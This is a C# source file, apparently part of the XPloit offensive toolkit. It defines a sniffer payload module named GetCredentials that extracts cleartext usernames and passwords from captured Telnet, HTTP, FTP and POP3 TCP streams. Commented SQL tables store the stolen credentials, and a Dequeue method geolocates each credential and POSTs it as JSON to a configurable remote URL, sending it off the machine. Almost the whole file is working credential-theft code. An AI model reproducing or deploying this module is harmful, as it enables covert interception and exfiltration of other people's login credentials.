using PacketDotNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Dynamic;
using System.Net;
using Xploit.Helpers.Geolocate;
using Xploit.Sniffer.Enums;
using Xploit.Sniffer.Extractors;
using Xploit.Sniffer.Interfaces;
using XPloit.Core;
using XPloit.Helpers.Attributes;
using XPloit.Sniffer.Streams;

namespace XPloit.Modules.Payloads.Local.Sniffer
{
    public class GetCredentials : Payload, Auxiliary.Local.Sniffer.IPayloadSniffer
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Sniffer passwords"; } }
        #endregion

        #region Properties
        public bool CaptureOnTcpStream { get { return true; } }
        public bool CaptureOnPacket { get { return false; } }
        /*
CREATE TABLE `pass_ftp` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_pop3` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `AUTH_TYPE` varchar(20) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`,`AUTH_TYPE`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_telnet` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`USER_HASH`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_httpauth` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` varchar(100) NOT NULL DEFAULT '',
  `PASS` varchar(255) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `pass_http` (
  `DATE` datetime NOT NULL,
  `HOST` varchar(100) NOT NULL DEFAULT '',
  `PORT` smallint(5) unsigned NOT NULL DEFAULT '0',
  `HTTP_HOST` varchar(100) NOT NULL DEFAULT '',
  `HTTP_URL` varchar(255) NOT NULL DEFAULT '',
  `USER_HASH` char(40) NOT NULL DEFAULT '',
  `USER` json NOT NULL,
  `PASS` json NOT NULL,
  `TYPE` varchar(10) NOT NULL DEFAULT '',
  `VALID` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `COUNTRY` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`HOST`,`PORT`,`HTTP_HOST`,`HTTP_URL`,`USER_HASH`,`TYPE`,`VALID`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
        */
        [ConfigurableProperty(Description = "Http post url", Optional = true)]
        public Uri APIRestUrl { get; set; }

        [ConfigurableProperty(Description = "Write credentials as info")]
        public bool WriteAsInfo { get; set; }
        #endregion

        Dictionary<string, string> _LastCred = new Dictionary<string, string>();

        public bool Check() { return true; }
        public void OnPacket(IPProtocolType protocolType, IpPacket packet) { }

        ICredentialExtractor[] _Checks = new ICredentialExtractor[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };
        public void OnTcpStream(TcpStream stream, bool isNew, ConcurrentQueue<object> queue)
        {
            if (stream == null || stream.Count == 0) return;

            if (stream.Variables == null)
            {
                stream.Variables = new ExpandoObject();
                stream.Variables.Valid = new bool[] { true, true, true };
            }

            // Check
            bool some = false;
            try
            {
                for (int x = stream.Variables.Valid.Length - 1; x >= 0; x--)
                {
                    if (!stream.Variables.Valid[x]) continue;

                    Credential[] cred;
                    switch (_Checks[x].GetCredentials(stream, out cred))
                    {
                        case EExtractorReturn.DontRetry:
                            {
                                stream.Variables.Valid[x] = false;
                                break;
                            }
                        case EExtractorReturn.Retry: some = true; break;
                        case EExtractorReturn.True:
                            {
                                stream.Dispose();

                                foreach (Credential c in cred)
                                {
                                    // Prevent reiteration
                                    string json = c.ToString(), last;
                                    if (_LastCred.TryGetValue(c.Type, out last) && last == json)
                                        continue;

                                    _LastCred[c.Type] = json;
                                    queue.Enqueue(c);
                                }

                                return;
                            }
                    }
                }
            }
            catch (Exception e)
            {
                WriteError(e.ToString());
            }

            if (!some)
                stream.Dispose();
        }

        public void Dequeue(object o)
        {
            Credential c = (Credential)o;

            c.RecallCounty(GeoLite2LocationProvider.Current);
            string json = c.ToString();

            // Console
            if (WriteAsInfo)
            {
                if (c.IsValid) WriteInfo(json);
                else WriteError(json);
            }

            // ApiRest
            if (APIRestUrl != null)
            {
                //using (HttpClient client = new HttpClient() { })
                //{
                //    using (HttpResponseMessage response = await client.PostAsync(APIRestUrl, new StringContent(json, Encoding.UTF8, "application/json")))
                //    {
                //        using (HttpContent content = response.Content)
                //        {
                //            //string data = await content.ReadAsStringAsync();
                //        }
                //    }
                //}

                //t.RunSynchronously();
                using (WebClient client = new WebClient())
                {
                    client.Headers[HttpRequestHeader.ContentType] = "application/json";

                    string ret = client.UploadString(APIRestUrl, "POST", json);
                    int r;
                    if (!int.TryParse(ret, out r))
                    {

                    }
                }
            }
        }
    }
}